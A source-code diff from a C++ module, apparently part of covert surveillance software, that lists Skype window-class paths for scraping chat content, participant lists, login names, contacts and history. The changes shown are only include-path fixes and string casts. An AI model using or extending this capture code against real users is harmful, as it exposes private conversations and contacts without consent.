@@ -11,49 +11,49 @@ using namespace std;
 
 #include "QSkype3.h"
 #include "QSkype2.h"
-#include "..\HM_SafeProcedures.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
 
 // Skype chat tree
 PWCHAR QSkype3::wChatTree[] = {
-	L"TskMultiChatForm.UnicodeClass",
-	L"TChatBackground",
-	L"TPanel",
-	L"TPanel",
-	L"TChatContentControl",
+	(PWCHAR)L"TskMultiChatForm.UnicodeClass",
+	(PWCHAR)L"TChatBackground",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TChatContentControl",
 	0
 };
 
 // Skype userlist
 PWCHAR QSkype3::wChatUserListTree[] = {
-	L"TskMultiChatForm.UnicodeClass",
-	L"TChatBackground",
-	L"TChatUserList",
+	(PWCHAR)L"TskMultiChatForm.UnicodeClass",
+	(PWCHAR)L"TChatBackground",
+	(PWCHAR)L"TChatUserList",
 	0
 };
 
 // Skype login name
 PWCHAR QSkype3::wLoginTree[] = {
-	L"tSkMainForm.UnicodeClass",
+	(PWCHAR)L"tSkMainForm.UnicodeClass",
 	0
 };
 
 // Skype contacts tree
 PWCHAR QSkype3::wContactTree[] = {
-	L"tSkMainForm.UnicodeClass",
-	L"TPanel",
-	L"TPanel",
-	L"TSkypeTabControl",
-	L"TMainUserList",
+	(PWCHAR)L"tSkMainForm.UnicodeClass",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TSkypeTabControl",
+	(PWCHAR)L"TMainUserList",
 	0
 };
 
 // Skype history list
 PWCHAR QSkype3::wHistoryTree[] = {
-	L"tSkMainForm.UnicodeClass",
-	L"TPanel",
-	L"TPanel",
-	L"TSkypeTabControl",
-	L"THistoryList",
+	(PWCHAR)L"tSkMainForm.UnicodeClass",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TSkypeTabControl",
+	(PWCHAR)L"THistoryList",
 	0
 };
 
@@ -70,7 +70,7 @@ QSkype3::QSkype3(const HWND hw) : QSkype2(hw)
 	if(HM_SafeGetWindowTextW(hw, wTopic, 256))
 		properties.SetId(wTopic);
 	else
-		properties.SetId(L"");
+		properties.SetId((PWCHAR)L"");
 
 	//GrabUserList();
 
@@ -220,7 +220,7 @@ BOOL QSkype3::GrabTopic() {
 	if(HM_SafeGetWindowTextW(properties.GetHandle(), wTitle, 256))
 		return properties.SetId(wTitle);
 	else
-		return properties.SetId(L"");
+		return properties.SetId((PWCHAR)L"");
 }
 
 // Questo metodo va chiamato una sola volta per finestra e prima di
@@ -231,7 +231,7 @@ BOOL QSkype3::GrabUserList() {
 	BOOL bRes;
 
 	if(!IsWindow(ole.GetHandle())){
-		properties.SetUsers(L"");
+		properties.SetUsers((PWCHAR)L"");
 		return FALSE;
 	}
 
